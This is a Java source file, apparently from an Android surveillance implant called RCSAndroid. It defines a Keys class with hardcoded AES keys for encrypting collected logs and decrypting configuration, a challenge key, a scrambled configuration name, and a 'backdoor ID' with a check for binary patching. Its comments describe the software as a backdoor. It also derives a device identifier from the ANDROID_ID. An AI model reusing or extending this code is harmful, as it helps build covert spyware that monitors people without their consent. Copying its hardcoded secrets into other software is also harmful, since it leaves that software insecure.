/**********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 01-dec-2010
 **********************************************/

package com.ht.RCSAndroidGUI.crypto;

import java.util.Arrays;

import android.provider.Settings.Secure;
import android.telephony.TelephonyManager;

import com.ht.RCSAndroidGUI.RCSAndroidGUI;
import com.ht.RCSAndroidGUI.Status;
import com.ht.RCSAndroidGUI.utils.Utils;

// This class should only be read by Device
public class Keys {
	static boolean useFake = true;
	private volatile static Keys singleton;

	public static Keys self() {
		if (singleton == null) {
			synchronized (Keys.class) {
				if (singleton == null) {
					if ( useFake ){
						singleton = new KeysFake();
					}else{
						singleton = new Keys();
					}
				}
			}
		}

		return singleton;
	}
	
	// Subversion
	private static final byte[] g_Subtype = { 'A', 'N', 'D', 'R', 'O', 'I', 'D' };
	//private static final byte[] g_Subtype = { 'A', 'N', 'D', 'R', 'O', 'I', 'D' };


	// AES key used to encrypt logs
	private static final byte[] g_AesKey = { '3', 'j', '9', 'W', 'm', 'm', 'D',
			'g', 'B', 'q', 'y', 'U', '2', '7', '0', 'F', 'T', 'i', 'd', '3',
			'7', '1', '9', 'g', '6', '4', 'b', 'P', '4', 's', '5', '2' };

	// AES key used to decrypt configuration
	private static final byte[] g_ConfKey = { 'A', 'd', 'f', '5', 'V', '5',
			'7', 'g', 'Q', 't', 'y', 'i', '9', '0', 'w', 'U', 'h', 'p', 'b',
			'8', 'N', 'e', 'g', '5', '6', '7', '5', '6', 'j', '8', '7', 'R' };

	// 20 bytes that uniquely identifies the device (non-static on purpose)
	private final byte[] g_InstanceId = { 'b', 'g', '5', 'e', 't', 'G', '8',
			'7', 'q', '2', '0', 'K', 'g', '5', '2', 'W', '5', 'F', 'g', '1' };

	// 16 bytes that uniquely identifies the backdoor, NULL-terminated
	private static final byte[] g_BackdoorID = { 'a', 'v', '3', 'p', 'V', 'c',
			'k', '1', 'g', 'b', '4', 'e', 'R', '2', 'd', '8', 0 };

	// Challenge key
	private static final byte[] g_Challenge = { 'f', '7', 'H', 'k', '0', 'f',
			'5', 'u', 's', 'd', '0', '4', 'a', 'p', 'd', 'v', 'q', 'w', '1',
			'3', 'F', '5', 'e', 'd', '2', '5', 's', 'o', 'V', '5', 'e', 'D' };

	// Configuration name, scrambled using the first byte of g_Challenge[]
	private static final String g_ConfName = "c3mdX053du1YJ541vqWILrc4Ff71pViL";

	/**
	 * Checks for been binary patched.
	 * 
	 * @return true, if successful
	 */
	public boolean hasBeenBinaryPatched() {
		return Utils.equals(g_BackdoorID, 0, new byte[] { 'a', 'v', '3', 'p',
				'V', 'c', 'k', '1', 'g', 'b', '4', 'e' }, 0, 12);
	}

	public byte[] getAesKey() {
		return g_AesKey;
	}

	public byte[] getChallengeKey() {
		return g_Challenge;
	}

	public byte[] getConfKey() {
		return g_ConfKey;
	}

	public byte[] getInstanceId() {
		String android_id = Secure.getString(RCSAndroidGUI.getAppContext().getContentResolver(),
                Secure.ANDROID_ID); 
		
		return Encryption.SHA1(android_id.getBytes());
	}
	
    public byte[] getBuildId() {
        return g_BackdoorID;
    }

	public byte[] getSubtype() {
		//return g_Subtype;
		//TODO
		return "BLACKBERRY".getBytes();
	}

}
